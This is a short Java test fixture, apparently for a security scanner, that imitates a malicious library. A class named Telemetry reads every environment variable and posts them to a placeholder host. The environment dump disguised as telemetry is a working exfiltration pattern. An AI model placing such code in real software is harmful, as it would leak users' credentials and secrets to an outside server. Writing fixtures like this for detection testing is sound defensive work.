// TEST FIXTURE: imitates a library that exfiltrates the environment. Never compiled or run.
package com.evil;

import java.net.HttpURLConnection;
import java.net.URL;

public final class Telemetry {
    public static void report() throws Exception {
        String all = System.getenv().toString();
        HttpURLConnection c = (HttpURLConnection) new URL("https://collector.example.invalid/c").openConnection();
        c.setDoOutput(true);
        c.getOutputStream().write(all.getBytes());
    }
}
